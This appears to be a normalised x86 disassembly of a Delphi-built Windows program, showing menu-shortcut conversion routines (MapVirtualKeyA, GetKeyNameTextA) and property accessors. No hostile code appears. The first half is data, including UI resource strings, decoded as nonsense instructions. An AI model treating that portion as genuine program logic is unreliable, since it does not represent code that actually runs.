inc eax
add [ eax ] bh
add [ eax ] al
inc ebp
add [ eax ] al
std
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
mov [ fs : edx + 0x7c0045 ] fs
add bh bh
int3
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
dec [ esp + esi * 8 ]
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
push eax
rol [ ebp ] 0x30
insb
inc ecx
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
dec [ eax - 0xb ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
inc ebp
add al ah
cld
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
or al 0xf4
mov esp 0x3c0045be
add [ eax ] al
[ eax + 0x1004607 ]
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
insd
inc ecx
add [ ebp + esi * 8 - 0x5d7ffbb ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
adc [ eax ] al
cmp eax 0x70ff0000
sti
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x5c6d6574
push edi
inc ecx
add [ eax ] ah
add bh bh
fdiv st5
inc ebp
add [ eax + 0x45fd ] ah
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
cwde
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
jmp [ eax - 0x3 ]
push edi
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
inc ecx
add ah al
push cs
inc edx
add ah ah
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
or eax [ edx ]
in al 0xe
inc edx
add [ eax ] dl
or [ esi ] al
mov esp 0x4610
or [ esi ] eax
in al dx
adc [ esi ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
lodsb [ esi ]
or [ esi ] al
push 0xcc00418b
or al [ edx ]
test [ edx + 0x10d40041 ] cl
inc esi
add [ eax + 0x11 ] dh
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
ja r-xdata
add dl al
les eax [ ebp ]
salc
les eax [ ebp ]
pop eax
add [ eax ] al
add [ ebx + ebp * 2 ] dh
je r-xdata
xor eax [ eax ]
loopne r-xdata
insd
dec esp
mov esi 0xa00045
add bh bh
mov al [ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
jae r-xdata
les ecx [ ebx ]
inc edx
add [ ebx + ecx + 0xee40042 ] bh
jb r-xdata
inc esi
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
dec ecx
je r-xdata
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
or eax [ edx ]
lodsb [ esi ]
or al 0x42
insd
lea eax [ eax ]
je r-xdata
jbe r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffba3c ] dh
les eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x45c4
sub_45c6bd
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
je r-xdata
outsb
je r-xdata
jl r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bh
mov [ ebp ] 0x6
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
mov ebp 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
add bh al
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
inc edx
jne r-xdata
inc ebp
add [ 0x654c616d ] cl
je r-xdata
inc eax
mov [ ebp ] 0x54540c03
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
dec esp
je r-xdata
jne r-xdata
add bh 0x45
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
outsd
outsb
add eax 0x756e654d
je r-xdata
mov [ ebp ] 0x4c00408d
enter 0x45 0x0
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsd
call 0x6460db0
insd
popad
dec esi
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or eax [ edx ]
in al 0xe
inc edx
add [ eax - 0x43ffb9e4 ] dl
adc [ esi ] al
add [ ecx ] cl
inc esi
add ah ch
adc [ esi ] al
cmp [ 0x1df00046 ] bl
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
add al 0x1d
inc esi
add [ eax - 0x75 ] ch
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
inc ecx
add ah cl
or al [ edx ]
test [ edx + 0x10d40041 ] cl
inc esi
add [ eax + 0x11 ] dh
inc esi
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
add [ ecx + esi + 0x40 ] al
add [ ebx - 0x7497ffba ] al
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
jo r-xdata
mov [ ebp ] 0x50540f03
outsd
outsb
mov [ ebp ] 0x4d540f03
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ edi + eax * 8 + 0x45 ] edi
add [ ebp - 0x37b3ffc0 ] cl
inc ebp
add [ eax ] al
je r-xdata
jne r-xdata
add [ eax - 0x3fffb9eb ] dh
adc eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x780045c8 ] dl
add [ eax ] al
add [ eax ] ch
les eax [ ebp ]
outsd
inc edx
outsd
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + eax * 8 ] bh
inc ebp
add [ 0x69526274 ] cl
push 0x74754274
jae r-xdata
add eax 0x756e654d
inc eax
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
outsd
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45c8 ] ah
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax - 0x5fffb9eb ] dl
adc eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
outsb
add eax 0x756e654d
jae r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
les ecx [ esi ]
inc edx
add ah ah
mov al [ 0x70045c8 ]
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
clc
cmovbe eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
[ edx + 0x10046 ]
mov [ edx + rw-data ] fs
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc esi
imul eax [ ecx + ebp * 2 + 0x4d ] 0x865646f
push edi
inc ecx
push esi
inc ecx
add [ eax ] dh
add [ eax ] al
[ eax ]
adc eax 0xe100046
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
add [ ebp + ebx + 0x46 ] cl
add [ ebp + ebx + 0x46 ] dl
or [ edi + 0x41 ] dl
add al 0xbf
inc ebp
add al 0x0
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x80045cb
jo r-xdata
inc ebx
push 0x65676e61
je r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
mov [ ebp ] 0xff000068
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
xor al 0x11
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
mov [ ebp ] 0xff000069
imul eax [ eax ] 0x1ff00
add [ eax ] al
add [ edx + ebp * 4 ] dh
inc edx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x35 ] ch
inc ebp
add [ eax ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
hlt
add al bh
outsb
adc [ ebp + 0x500045 ] bh
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + eax ] al
enter 0x45 0xdc
les eax [ ebp ]
adc [ eax ] al
add eax 0x756e654d
jae r-xdata
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
je r-xdata
pop esp
shl al 0xca
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 8 ] al
inc ebp
add [ eax + eax ] dl
add [ eax ] al
clc
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al 0xbf
inc ebp
add ah bh
mov [ ebp ] 0x60
add [ eax ] al
jmp [ eax ]
push esp
push eax
outsd
jo r-xdata
inc edx
add al bl
stosd [ edi ]
inc edx
add [ eax - 0x5bffbd55 ] bh
stosd [ edi ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ ecx ] dh
jo r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
imul esi [ ebx + 0x74 ] 0x45cb5c90
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_451374
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_45cba8
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_44ba04
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_451374
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_45cc00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_45cc38
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f20
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404190
sub_45cc8c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_45ce75
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fb8
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404108
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fb8
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403fb8
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404108
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404108
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f20
mov eax esi
call sub_403f20
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403fb8
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408054
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40422c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_45cc38
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041e8
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fb8
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041e8
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4041e8
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ce7c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f44
retn
sub_45ce90
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4041e0
push eax
mov eax edi
call sub_4041e0
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4041e0
push eax
mov eax edi
call sub_4043e0
push eax
mov eax [ esi ]
call sub_4043e0
pop edx
pop ecx
call sub_407f34
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4041e0
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404480
sub_45ceec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4043d0
xor eax eax
push ebp
push sub_45cfc7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45ce90
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45ce90
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45ce90
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45ce90
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cfce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45cc8c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407ee4
test eax eax
jne r-xdata
sub_45d004
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45f5a4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45f5b4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_45d064
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45f5a4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45f5a4
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45f5b4
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45f5b4
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45d004
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45d004
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45f5b4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45f5b4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45d1b0
push ebx
mov ebx eax
mov eax ebx
call sub_4598a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4620c0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45d1e8
push ebx
mov ebx eax
mov eax ebx
call sub_4598b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d218
push ebx
mov ebx eax
mov eax ebx
call sub_4598c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d248
push ebx
mov ebx eax
mov eax ebx
call sub_4598f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d278
push ebx
mov ebx eax
mov eax ebx
call sub_459918
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_40432c
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d2ac
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4598dc
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d2e8
push ebx
mov ebx eax
mov eax ebx
call sub_45992c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d31c
push ebx
mov ebx eax
mov eax ebx
call sub_459940
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d350
push ebx
mov ebx eax
mov eax ebx
call sub_459954
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d384
push ebx
mov ebx eax
mov eax ebx
call sub_421044
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d3ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45d3cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f40c
sub_45d3ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f47c
sub_45d40c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f4d0
sub_45d42c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45d448
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
